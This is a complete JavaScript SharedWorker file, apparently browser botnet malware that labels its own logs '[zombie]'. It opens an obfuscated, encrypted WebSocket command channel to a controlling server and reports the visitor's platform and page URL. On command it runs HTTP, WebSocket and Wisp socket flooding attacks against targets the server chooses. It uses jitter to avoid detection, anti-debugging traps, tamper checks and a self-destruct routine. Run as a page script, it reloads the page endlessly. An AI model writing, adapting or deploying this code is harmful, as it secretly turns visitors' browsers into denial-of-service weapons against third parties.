(function() {
    if (typeof SharedWorkerGlobalScope !== 'undefined') {
function suicide() {
    try { ws && ws.close(); } catch {}
    try { self.close(); } catch {}
    setTimeout(function() { while (true) { console.log(" "); } }, 1000);
}

const _h = new URL(self.location.origin).hostname;
const _isDev = _h === 'localhost' || _h === '127.0.0.1' || _h === '::1' || _h.endsWith('.local');
function log() { if (_isDev) { const a = Array.prototype.slice.call(arguments); console.log.apply(console, ['[zombie]'].concat(a)); } }

if (!_isDev) {
    setInterval(function() {
        const t0 = Date.now();
        const p0 = performance.now();
        eval("debugger");
        if (Date.now() - t0 > 300 || performance.now() - p0 > 300) suicide();
    }, 15000);
}

if (!_isDev) (function() {
    const _ts = Function.prototype.toString;
    const _indexOf = String.prototype.indexOf;
    const _nc = 'native code';
    const _ownDesc = Object.getOwnPropertyDescriptor;
    const _getProto = Object.getPrototypeOf;
    const _hasOwn = Object.prototype.hasOwnProperty;

    function _isNative(fn, name) {
        var s;
        try { s = _ts.call(fn); } catch { return false; }
        if (_indexOf.call(s, _nc) === -1) return false;
        if (_indexOf.call(s, name) === -1) return false;
        return true;
    }

    function _isProxy(obj) {
        try {
            void _ownDesc(obj, ' ');
        } catch { return true; }
        return false;
    }

    function _checkDescriptor(obj, prop) {
        const d = _ownDesc(obj, prop);
        if (!d) return true;
        if (!d.writable || !d.configurable) return false;
        return true;
    }

    const _checks = [
        [function() { return crypto.subtle.deriveBits; },             'deriveBits',              crypto.subtle.deriveBits],
        [function() { return crypto.subtle.deriveKey; },              'deriveKey',               crypto.subtle.deriveKey],
        [function() { return crypto.subtle.importKey; },              'importKey',               crypto.subtle.importKey],
        [function() { return crypto.subtle.exportKey; },              'exportKey',               crypto.subtle.exportKey],
        [function() { return crypto.subtle.generateKey; },            'generateKey',             crypto.subtle.generateKey],
        [function() { return crypto.subtle.encrypt; },                'encrypt',                 crypto.subtle.encrypt],
        [function() { return crypto.subtle.decrypt; },                'decrypt',                 crypto.subtle.decrypt],
        [function() { return crypto.subtle.digest; },                 'digest',                  crypto.subtle.digest],
        [function() { return crypto.getRandomValues; },               'getRandomValues',         crypto.getRandomValues],
        [function() { return WebSocket.prototype.send; },             'send',                    WebSocket.prototype.send],
        [function() { return WebSocket.prototype.close; },            'close',                   WebSocket.prototype.close],
        [function() { return JSON.parse; },                           'parse',                   JSON.parse],
        [function() { return JSON.stringify; },                       'stringify',               JSON.stringify],
        [function() { return TextEncoder.prototype.encode; },         'encode',                  TextEncoder.prototype.encode],
        [function() { return TextDecoder.prototype.decode; },         'decode',                  TextDecoder.prototype.decode],
        [function() { return Uint8Array; },                           'Uint8Array',              Uint8Array],
        [function() { return ArrayBuffer; },                          'ArrayBuffer',             ArrayBuffer],
        [function() { return DataView; },                             'DataView',                DataView],
        [function() { return Promise.prototype.then; },               'then',                    Promise.prototype.then],
        [function() { return Function.prototype.toString; },          'toString',                Function.prototype.toString],
        [function() { return setInterval; },                          'setInterval',             setInterval],
        [function() { return setTimeout; },                           'setTimeout',              setTimeout],
        [function() { return clearInterval; },                        'clearInterval',           clearInterval],
        [function() { return Date.now; },                             'now',                     Date.now],
        [function() { return performance.now; },                      'now',                     performance.now],
        [function() { return String.prototype.indexOf; },             'indexOf',                 String.prototype.indexOf],
        [function() { return Object.defineProperty; },                'defineProperty',          Object.defineProperty],
        [function() { return Object.getOwnPropertyDescriptor; },      'getOwnPropertyDescriptor', Object.getOwnPropertyDescriptor],
        [function() { return WebSocket; },                            'WebSocket',               WebSocket],
        [function() { return MessagePort.prototype.postMessage; },    'postMessage',             MessagePort.prototype.postMessage],
        [function() { return Object.getPrototypeOf; },                'getPrototypeOf',          Object.getPrototypeOf],
        [function() { return Object.prototype.hasOwnProperty; },      'hasOwnProperty',          Object.prototype.hasOwnProperty],
        [function() { return Reflect.apply; },                        'apply',                   Reflect.apply],
        [function() { return Reflect.ownKeys; },                      'ownKeys',                 Reflect.ownKeys],
        [function() { return Reflect.getPrototypeOf; },               'getPrototypeOf',          Reflect.getPrototypeOf],
        [function() { return fetch; },                                'fetch',                   fetch],
    ];

    const _subtleProtoSnap = _getProto(crypto.subtle);
    var _cryptoSnap  = crypto;
    var _subtleSnap  = crypto.subtle;
    var _wsProtoSnap = WebSocket.prototype;
    var _expectedLen = _checks.length;

    function _check() {
        if (_checks.length !== _expectedLen) { suicide(); return; }
        if (crypto         !== _cryptoSnap)  { suicide(); return; }
        if (crypto.subtle  !== _subtleSnap)  { suicide(); return; }
        if (WebSocket.prototype !== _wsProtoSnap) { suicide(); return; }
        if (_getProto(crypto.subtle) !== _subtleProtoSnap) { suicide(); return; }
        if (_isProxy(crypto)) { suicide(); return; }
        if (_isProxy(crypto.subtle)) { suicide(); return; }
        if (_isProxy(WebSocket.prototype)) { suicide(); return; }
        try {
            if (_ownDesc(crypto.subtle, 'digest')      !== undefined) { suicide(); return; }
            if (_ownDesc(crypto.subtle, 'importKey')   !== undefined) { suicide(); return; }
            if (_ownDesc(crypto.subtle, 'exportKey')   !== undefined) { suicide(); return; }
            if (_ownDesc(crypto.subtle, 'generateKey') !== undefined) { suicide(); return; }
            if (_ownDesc(crypto.subtle, 'deriveBits')  !== undefined) { suicide(); return; }
            if (_ownDesc(crypto.subtle, 'deriveKey')   !== undefined) { suicide(); return; }
            if (_ownDesc(crypto.subtle, 'encrypt')     !== undefined) { suicide(); return; }
            if (_ownDesc(crypto.subtle, 'decrypt')     !== undefined) { suicide(); return; }
            if (_ownDesc(crypto, 'subtle')             !== undefined) { suicide(); return; }
            if (_ownDesc(crypto, 'getRandomValues')    !== undefined) { suicide(); return; }
            if (_ownDesc(performance, 'now')           !== undefined) { suicide(); return; }
            if (_hasOwn.call(WebSocket.prototype, 'send') && !_isNative(WebSocket.prototype.send, 'send')) { suicide(); return; }
        } catch { suicide(); return; }
        for (var i = 0; i < _checks.length; i++) {
            var cur;
            try { cur = _checks[i][0](); } catch { suicide(); return; }
            if (cur !== _checks[i][2]) { suicide(); return; }
            if (!_isNative(cur, _checks[i][1])) { suicide(); return; }
        }
        try {
            const _subtleKeys = Reflect.ownKeys(crypto.subtle);
            for (var k = 0; k < _subtleKeys.length; k++) {
                if (typeof _subtleKeys[k] !== 'string') continue;
                const kd = _ownDesc(crypto.subtle, _subtleKeys[k]);
                if (kd && typeof kd.value === 'function') { suicide(); return; }
            }
        } catch { suicide(); return; }
    }
    setInterval(_check, 10000);

    (function() {
        const _expected = [0xe3,0xb0,0xc4,0x42,0x98,0xfc,0x1c,0x14,0x9a,0xfb,0xf4,0xc8,0x99,0x6f,0xb9,0x24,0x27,0xae,0x41,0xe4,0x64,0x9b,0x93,0x4c,0xa4,0x95,0x99,0x1b,0x78,0x52,0xb8,0x55];
        crypto.subtle.digest('SHA-256', new Uint8Array(0)).then(function(buf) {
            const b = new Uint8Array(buf);
            for (var i = 0; i < _expected.length; i++) {
                if (b[i] !== _expected[i]) { suicide(); return; }
            }
        }).catch(function() { suicide(); });
    })();
})();

        let siteHandlerOrigin = null;
        let siteHref = null;
        let wsUrl = null;
        let ports = [];
        let ws = null;
        let attackIntervals = null;
        let wsSpawnInterval = null,
            wsConns = new Set();
        let wispSpawnInterval = null,
            wispConns = new Set();
        let lastTarget = null,
            isActive = false;

        const noop = function() {};
        const MAX_FETCH = 24;
        const MAX_SOCKS = 16;
        const MIN_IV = 50;
        const MIN_WS_BYTES = 262144;
        const STREAM_CHUNK = 16384;
        const JITTER = 0.5;
        let _lag = 0;
        let _beat = 0;
        setInterval(function() {
            var now = performance.now();
            if (_beat) _lag = now - _beat - 250;
            _beat = now;
        }, 250);

        function _clamp(n, lo, hi) {
            n = n | 0;
            if (n < lo) return lo;
            if (n > hi) return hi;
            return n;
        }

        function _overloaded() {
            return _lag > 80;
        }

        function _jitter(ms) {
            var j = ms * JITTER;
            return Math.max(MIN_IV, Math.round(ms - j + Math.random() * j * 2));
        }

        function _jittered(fn, ms) {
            var token = { dead: false };
            (function loop() {
                if (token.dead || _overloaded()) {
                    if (!token.dead) setTimeout(loop, _jitter(ms));
                    return;
                }
                fn();
                setTimeout(loop, _jitter(ms));
            })();
            return token;
        }

        let _aesKey = null;
        let _sendQueue = [];
        let _msgChain = Promise.resolve();
        let _hkdfInfo = null;

        const _ppx = 0x5C;
        const _pp = new Uint8Array([
            0x22,0x4D,0x97,0x66,0xA9,0xCE,0x3C,0x1B,
            0x71,0xD8,0x45,0xF2,0x0F,0x9A,0x57,0x84,
            0x13,0xCB,0x7E,0xE7,0x30,0x6D,0xBC,0x06,
            0xC5,0x48,0x21,0xAC,0x17,0xFF,0x34,0x81,
        ].map(function(v){return v^_ppx;}));

        function _decUTF8(b) {
            var s = '', i = 0, n = b.length, c;
            while (i < n) {
                c = b[i];
                if (c < 0x80) { s += String.fromCharCode(c); i++; }
                else if ((c & 0xE0) === 0xC0 && i + 1 < n) { s += String.fromCharCode(((c & 0x1F) << 6) | (b[i+1] & 0x3F)); i += 2; }
                else if ((c & 0xF0) === 0xE0 && i + 2 < n) { s += String.fromCharCode(((c & 0x0F) << 12) | ((b[i+1] & 0x3F) << 6) | (b[i+2] & 0x3F)); i += 3; }
                else { i++; }
            }
            return s;
        }

        function _encAscii(s) {
            var b = new Uint8Array(s.length), i = 0;
            for (; i < s.length; i++) b[i] = s.charCodeAt(i) & 0xFF;
            return b;
        }

        function _jqStr(v) {
            var r = '"', i = 0, c;
            for (; i < v.length; i++) {
                c = v.charCodeAt(i);
                if (c === 0x22) r += '\\"';
                else if (c === 0x5C) r += '\\\\';
                else r += v[i];
            }
            return r + '"';
        }

        function _jStr(s, k) {
            var pat = '"' + k + '":"', idx = s.indexOf(pat);
            if (idx < 0) return '';
            idx += pat.length;
            var r = '', esc = false, ch;
            while (idx < s.length) {
                ch = s[idx++];
                if (esc) {
                    if (ch === '"') r += '"';
                    else if (ch === '\\') r += '\\';
                    else if (ch === 'n') r += '\n';
                    else if (ch === 'r') r += '\r';
                    else if (ch === 't') r += '\t';
                    else r += ch;
                    esc = false;
                } else if (ch === '\\') { esc = true; }
                else if (ch === '"') { break; }
                else { r += ch; }
            }
            return r;
        }

        function _jBool(s, k) {
            var pat = '"' + k + '":', idx = s.indexOf(pat);
            if (idx < 0) return false;
            return s.charCodeAt(idx + pat.length) === 116;
        }

        function _jInt(s, k, def) {
            var pat = '"' + k + '":', idx = s.indexOf(pat);
            if (idx < 0) return def;
            idx += pat.length;
            var n = 0, has = false, c;
            while (idx < s.length) {
                c = s.charCodeAt(idx);
                if (c >= 48 && c <= 57) { n = n * 10 + (c - 48); has = true; idx++; }
                else break;
            }
            return has ? n : def;
        }

        function _parseMsg(b) {
            var s = _decUTF8(b);
            var t = _jStr(s, 't');
            if (t === 'ping') return {t: 'ping'};
            if (t === 'act') return {t: 'act', v: _jBool(s, 'v')};
            if (t === 'tg') return {
                t: 'tg',
                u:   _jStr(s, 'u').trim(),   m:   _jStr(s, 'm').trim(),   dv:  _jStr(s, 'dv').trim(),
                wu:  _jStr(s, 'wu').trim(),  wd:  _jStr(s, 'wd').trim(),  pu:  _jStr(s, 'pu').trim(),
                ph:  _jStr(s, 'ph').trim(),
                r:   _jBool(s, 'r'),  d:   _jBool(s, 'd'),  cns: _jBool(s, 'cns'),
                nc:  _jBool(s, 'nc'), nr:  _jBool(s, 'nr'),
                eh:  _jBool(s, 'eh'), ew:  _jBool(s, 'ew'), ewi: _jBool(s, 'ewi'),
                sd:  _jBool(s, 'sd'), storm: _jBool(s, 'storm'),
                iv:  _jInt(s, 'iv', 1000),  wi:  _jInt(s, 'wi', 1000),
                wdi: _jInt(s, 'wdi', 0),    pi:  _jInt(s, 'pi', 1000),
                pp:  _jInt(s, 'pp', 1),     pdi: _jInt(s, 'pdi', 100),
                ht:  _jInt(s, 'ht', 1),     wt:  _jInt(s, 'wt', 1),
                pt:  _jInt(s, 'pt', 1)
            };
            return null;
        }

        function expandRepeat(s) {
            if (!s) return s;
            var _ch = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789';
            s = s.replace(/\{([^}]*)\}(\d+)/g, function(_, c, n) { return c.repeat(+n); });
            return s.replace(/\[(\d+)\]/g, function(_, n) {
                var r = '', i = +n;
                while (i--) r += _ch[Math.floor(Math.random() * _ch.length)];
                return r;
            });
        }

        function broadcast(msg) {
            for (let i = 0; i < ports.length; i++) try {
                ports[i].postMessage(msg);
            } catch {}
        }

        function stopAttack() {
            if (attackIntervals) {
                log('stopAttack');
                for (const tk of attackIntervals.tokens) tk.dead = true;
                for (const ac of attackIntervals.controllers) { try { ac.abort(); } catch {} }
                attackIntervals = null;
            }
        }

        function stopWsAttack() {
            if (wsSpawnInterval) {
                log('stopWsAttack', wsConns.size, 'conns');
                for (const tk of wsSpawnInterval.tokens) tk.dead = true;
                wsSpawnInterval = null;
            }
            for (let conn of wsConns) {
                try {
                    conn.s.close();
                } catch {}
                if (conn.t) clearInterval(conn.t);
            }
            wsConns.clear();
        }

        function stopWispAttack() {
            if (wispSpawnInterval) {
                log('stopWispAttack', wispConns.size, 'conns');
                for (const tk of wispSpawnInterval.tokens) tk.dead = true;
                wispSpawnInterval = null;
            }
            for (let conn of wispConns) {
                try {
                    conn.s.close();
                } catch {}
                if (conn.t) clearInterval(conn.t);
            }
            wispConns.clear();
        }

        function startAttack(t) {
            stopAttack();
            if (!t || !t.u) { log('startAttack: no url, skipping'); return; }
            const method = t.m || 'GET';
            const wantsBody = t.d && t.dv && method !== 'GET' && method !== 'HEAD';
            const streamMode = wantsBody && t.sd !== false;
            const opts = { method, redirect: 'manual' };
            if (t.nc !== false) opts.mode = 'no-cors';
            if (t.nr !== false) opts.referrerPolicy = 'no-referrer';
            if (t.cns) opts.cache = 'no-store';
            const base = expandRepeat(t.u);
            const randomize = !!t.r;
            const sep = base.indexOf('?') === -1 ? '?' : '&';
            const iv = Math.max(MIN_IV, t.iv || 1000);
            const body = wantsBody ? expandRepeat(t.dv) : null;
            if (wantsBody && !streamMode) opts.body = body;
            if (streamMode) { opts.keepalive = false; opts.duplex = 'half'; }
            else opts.keepalive = true;
            const goal = _clamp(t.ht || 1, 1, MAX_FETCH);
            log('startAttack', t.u, 'pipe:', goal, 'iv:', iv, 'mode:', streamMode ? 'stream' : 'burst');
            let inflight = 0;
            let slow = 0;
            let fast = 0;
            let boost = 0;
            const controllers = new Set();
            attackIntervals = { tokens: [], controllers: controllers, streamMode: streamMode };
            function makeBody() {
                let chunk = body;
                if (chunk.length < STREAM_CHUNK) chunk = (chunk + 'A'.repeat(STREAM_CHUNK)).slice(0, STREAM_CHUNK);
                return new ReadableStream({
                    pull(c) {
                        if (!attackIntervals) { try { c.close(); } catch {} return; }
                        try { c.enqueue(chunk); } catch {}
                    }
                });
            }
            function fire() {
                if (inflight >= (_overloaded() ? 1 : goal + boost)) return;
                inflight++;
                const t0 = performance.now();
                const o = opts;
                const ac = streamMode ? new AbortController() : null;
                if (ac) {
                    controllers.add(ac);
                    o.signal = ac.signal;
                    o.body = makeBody();
                }
                const url = randomize ? base + sep + Math.random().toString(36).substring(2, 8) : base;
                try {
                    fetch(url, o).then(function(res) {
                        try { if (res && res.body) res.body.cancel(); } catch {}
                    }).catch(noop).finally(function() {
                        if (ac) controllers.delete(ac);
                        inflight--;
                        const dt = performance.now() - t0;
                        if (dt > 2500) { slow++; fast = 0; }
                        else if (slow) slow--;
                        else if (++fast >= 20 && boost < 8) { boost++; fast = 0; log('boost ->', goal + boost); }
                    });
                } catch { if (ac) controllers.delete(ac); inflight--; }
            }
            function pump() {
                if (_overloaded() || slow > 4) {
                    if (inflight === 0) fire();
                    return;
                }
                while (inflight < goal + boost) fire();
            }
            pump();
            attackIntervals.tokens = [_jittered(pump, iv)];
        }

        function startWsAttack(t) {
            stopWsAttack();
            if (!t || !t.wu) { log('startWsAttack: no url, skipping'); return; }
            const pool = _clamp(t.wt || 1, 1, MAX_SOCKS);
            let payload = t.wd ? expandRepeat(t.wd) : null;
            if (payload) {
                const fill = 'A'.repeat(4096);
                while (payload.length < MIN_WS_BYTES) payload += fill;
            }
            const wdi = t.wdi > 0 ? Math.max(MIN_IV, t.wdi) : 0;
            const wu = expandRepeat(t.wu);
            const wi = Math.max(MIN_IV, t.wi || 1000);
            const storm = t.storm !== false;
            log('startWsAttack', wu, 'pool:', pool, storm ? 'storm' : 'hold');
            function spawn() {
                if (wsConns.size >= pool || _overloaded()) return;
                try {
                    const sock = new WebSocket(wu);
                    const conn = { s: sock };
                    wsConns.add(conn);
                    sock.onopen = function() {
                        if (payload && !wdi) {
                            try { sock.send(payload); } catch {}
                        }
                        if (storm) {
                            setTimeout(function() {
                                try { sock.close(); } catch {}
                            }, 3000 + Math.random() * 3000);
                        }
                    };
                    sock.onerror = noop;
                    sock.onclose = function() { wsConns.delete(conn); };
                } catch {}
            }
            function sendAll() {
                if (!payload || _overloaded()) return;
                for (const conn of wsConns) {
                    if (conn.s.readyState === 1) {
                        try { conn.s.send(payload); } catch {}
                    }
                }
            }
            spawn();
            const tokens = [_jittered(spawn, wi)];
            if (payload && wdi) tokens.push(_jittered(sendAll, wdi));
            wsSpawnInterval = { tokens: tokens };
        }

        function startWispAttack(t) {
            stopWispAttack();
            if (!t || !t.pu) { log('startWispAttack: no url, skipping'); return; }
            const pool = _clamp(t.pt || 1, 1, MAX_SOCKS);
            const hostBytes = new TextEncoder().encode(expandRepeat(t.ph || 'localhost'));
            const port = t.pp || 1;
            const pdi = t.pdi > 0 ? Math.max(MIN_IV, t.pdi) : 100;
            const pu = expandRepeat(t.pu);
            const pi = Math.max(MIN_IV, t.pi || 1000);
            log('startWispAttack', pu, 'pool:', pool);
            const cbSize = 1 + 4 + 1 + 2 + hostBytes.byteLength;
            const cbTpl = new Uint8Array(cbSize);
            cbTpl[0] = 0x01;
            cbTpl[5] = 0x01;
            new DataView(cbTpl.buffer).setUint16(6, port, true);
            cbTpl.set(hostBytes, 8);
            const lbTpl = new Uint8Array([0x04, 0, 0, 0, 0, 0x02]);
            const dataLen = _clamp(t.wt || 1, 1, 8) * 16384;
            const dataChunk = new Uint8Array(dataLen);
            for (var di = 0; di < dataLen; di++) dataChunk[di] = (di * 31 + 7) & 0xff;
            const lbLen = lbTpl.length + dataLen;
            function spawn() {
                if (wispConns.size >= pool || _overloaded()) return;
                try {
                    const sock = new WebSocket(pu);
                    sock.binaryType = 'arraybuffer';
                    const conn = { s: sock, sc: 1, cb: cbTpl.slice(), lb: new Uint8Array(lbLen) };
                    conn.lb.set(lbTpl, 0);
                    conn.lb.set(dataChunk, lbTpl.length);
                    conn.cbDv = new DataView(conn.cb.buffer);
                    conn.lbDv = new DataView(conn.lb.buffer);
                    wispConns.add(conn);
                    sock.onerror = noop;
                    sock.onclose = function() { wispConns.delete(conn); };
                } catch {}
            }
            function sendAll() {
                if (_overloaded()) return;
                for (const conn of wispConns) {
                    if (conn.s.readyState !== 1) continue;
                    try {
                        conn.cbDv.setUint32(1, conn.sc, true);
                        conn.lbDv.setUint32(1, conn.sc, true);
                        conn.s.send(conn.cb);
                        conn.s.send(conn.lb);
                        conn.sc = (conn.sc + 1) >>> 0 || 1;
                    } catch {}
                }
            }
            spawn();
            wispSpawnInterval = { tokens: [_jittered(spawn, pi), _jittered(sendAll, pdi)] };
        }

        function applyTarget(t) {
            log('applyTarget eh=%s ew=%s ewi=%s u=%s', t.eh, t.ew, t.ewi, t.u);
            if (t.eh !== false) startAttack(t);
            else stopAttack();
            if (t.ew !== false) startWsAttack(t);
            else stopWsAttack();
            if (t.ewi !== false) startWispAttack(t);
            else stopWispAttack();
        }

        async function streamToBuffer(stream) {
            const chunks = [];
            const reader = stream.getReader();
            while (true) {
                const { done, value } = await reader.read();
                if (done) break;
                chunks.push(value);
            }
            let len = 0;
            for (const c of chunks) len += c.length;
            const out = new Uint8Array(len);
            let off = 0;
            for (const c of chunks) { out.set(c, off); off += c.length; }
            return out;
        }

        async function deflate(bytes) {
            const cs = new CompressionStream('deflate-raw');
            const writer = cs.writable.getWriter();
            writer.write(bytes);
            writer.close();
            return streamToBuffer(cs.readable);
        }

        async function inflate(bytes) {
            const ds = new DecompressionStream('deflate-raw');
            const writer = ds.writable.getWriter();
            writer.write(bytes);
            writer.close();
            return streamToBuffer(ds.readable);
        }

        async function sendEnc(s) {
            try {
                if (!_aesKey) { _sendQueue.push(s); return; }
                const plain = await deflate(_encAscii(s));
                for (var _pi = 0; _pi < plain.length; _pi++) plain[_pi] ^= _pp[_pi % 32];
                const iv = crypto.getRandomValues(new Uint8Array(12));
                const ct = new Uint8Array(await crypto.subtle.encrypt({ name: 'AES-GCM', iv }, _aesKey, plain));
                const frame = new Uint8Array(1 + 12 + ct.length);
                frame[0] = 0x01;
                frame.set(iv, 1);
                frame.set(ct, 13);
                ws.send(frame);
            } catch { try { ws.close(); } catch {} }
        }

        async function handleMessage(raw) {
            try {
                const frame = new Uint8Array(raw);
                if (!frame.length) { ws.close(); return; }
                const type = frame[0];

                if (type === 0x03) {
                    if (frame.length !== 17) { ws.close(); return; }
                    _hkdfInfo = frame.slice(1);
                    return;
                }

                if (type === 0x02) {
                    if (!_hkdfInfo) { ws.close(); return; }
                    const serverPubSpki = frame.slice(1);
                    const _mx = 0x6B;
                    const _mask = new Uint8Array([
                        0xDA,0x35,0x47,0xCC,0xE8,0x9F,0x15,0x06,
                        0xDD,0x87,0x13,0xC6,0x1F,0x47,0xD5,0x18,
                        0xDB,0xCC,0x35,0x77,0xF0,0x26,0xE0,0xCF,
                        0xE6,0x1C,0x5F,0x89,0x70,0xC9,0x74,0x74,
                    ].map(function(v){return v^_mx;}));
                    for (let i = 0; i < serverPubSpki.length; i++) serverPubSpki[i] ^= _mask[i % _mask.length];
                    let serverPub;
                    try {
                        serverPub = await crypto.subtle.importKey('spki', serverPubSpki, { name: 'ECDH', namedCurve: 'P-256' }, false, []);
                    } catch { ws.close(); return; }
                    let kp;
                    try {
                        kp = await crypto.subtle.generateKey({ name: 'ECDH', namedCurve: 'P-256' }, true, ['deriveBits']);
                    } catch { ws.close(); return; }
                    let shared;
                    try {
                        shared = await crypto.subtle.deriveBits({ name: 'ECDH', public: serverPub }, kp.privateKey, 256);
                    } catch { ws.close(); return; }
                    let keyMat;
                    try {
                        keyMat = await crypto.subtle.importKey('raw', shared, 'HKDF', false, ['deriveKey']);
                        const _sv = 0x10000+0x4000+0x300+0x35;
                        const _saltBuf = new ArrayBuffer(4);
                        new DataView(_saltBuf).setUint32(0, _sv, true);
                        _aesKey = await crypto.subtle.deriveKey(
                            { name: 'HKDF', hash: 'SHA-256', salt: new Uint8Array(_saltBuf), info: _hkdfInfo },
                            keyMat,
                            { name: 'AES-GCM', length: 128 },
                            false,
                            ['encrypt', 'decrypt']
                        );
                    } catch { ws.close(); return; }
                    _hkdfInfo = null;
                    const pubSpki = new Uint8Array(await crypto.subtle.exportKey('spki', kp.publicKey));
                    const reply = new Uint8Array(1 + pubSpki.length);
                    reply[0] = 0x02;
                    reply.set(pubSpki, 1);
                    ws.send(reply);
                    log('handshake done, aesKey set, draining queue len=%d', _sendQueue.length);
                    const q = _sendQueue.splice(0);
                    for (const m of q) await sendEnc(m);
                    return;
                }

                if (type === 0x01) {
                    if (!_aesKey) { ws.close(); return; }
                    const iv = frame.slice(1, 13);
                    const ct = frame.slice(13);
                    let plain;
                    try {
                        plain = new Uint8Array(await crypto.subtle.decrypt({ name: 'AES-GCM', iv }, _aesKey, ct));
                    } catch { ws.close(); return; }
                    for (var _pi = 0; _pi < plain.length; _pi++) plain[_pi] ^= _pp[_pi % 32];
                    let decompressed;
                    try { decompressed = await inflate(plain); } catch { ws.close(); return; }
                    let msg;
                    try { msg = _parseMsg(decompressed); if (!msg) { ws.close(); return; } } catch { ws.close(); return; }

                    if (msg.t === 'ping') {
                        log('ping -> pong');
                        sendEnc('{"t":"pong"}');
                        return;
                    }
                    if (msg.t === 'act') {
                        log('act', msg.v);
                        isActive = msg.v;
                        if (msg.v) {
                            if (lastTarget) applyTarget(lastTarget);
                            else { log('no lastTarget, requesting tg'); sendEnc('{"t":"getTarget"}'); }
                        } else {
                            log('deactivating');
                            stopAttack();
                            stopWsAttack();
                            stopWispAttack();
                        }
                        return;
                    }
                    if (msg.t === 'tg') {
                        log('tg received u=%s isActive=%s', msg.u, isActive);
                        lastTarget = msg;
                        if (isActive) applyTarget(msg);
                        return;
                    }
                    ws.close();
                    return;
                }

                ws.close();
            } catch { try { ws.close(); } catch {} }
        }

        function connect() {
            log('connect', wsUrl);
            _aesKey = null;
            _hkdfInfo = null;
            _sendQueue = [];
            _msgChain = Promise.resolve();
            ws = new WebSocket(wsUrl);
            ws.binaryType = 'arraybuffer';
            ws.addEventListener('open', function() {
                log('ws open, sending fp');
                sendEnc('{"t":"fp","d":{"p":' + _jqStr(navigator.platform) + '},"h":' + _jqStr(siteHref) + '}');
            });
            ws.addEventListener('message', function(e) {
                _msgChain = _msgChain.then(function() { return handleMessage(e.data); }).catch(function() { log('msgChain catch, closing'); try { ws.close(); } catch {} });
            });
            ws.addEventListener('close', function(e) {
                log('ws close code=%s reason=%s', e.code, e.reason);
                _aesKey = null;
                _sendQueue = [];
                _msgChain = Promise.resolve();
                stopAttack();
                stopWsAttack();
                stopWispAttack();
                setTimeout(connect, 2000);
            });
            ws.addEventListener('error', function(e) { log('ws error', e && e.message); });
        }

        setInterval(function() {
            broadcast(Math.floor(Math.random() * 100) + 1);
        }, 2000);

        self.addEventListener('connect', function(e) {
            const port = e.ports[0];
            ports.push(port);
            port.start();
            port.addEventListener('message', function(ev) {
                if (ev.data && ev.data.t === 'i' && !siteHandlerOrigin) {
                    siteHandlerOrigin = ev.data.o;
                    siteHref = ev.data.h || '';
                    wsUrl = siteHandlerOrigin.replace(/^http/, 'ws') + '/connection/';
                    connect();
                }
            });
        });
    } else if (typeof window !== 'undefined') {
        while (true) {
            location.reload(1);
        }
    }
})();
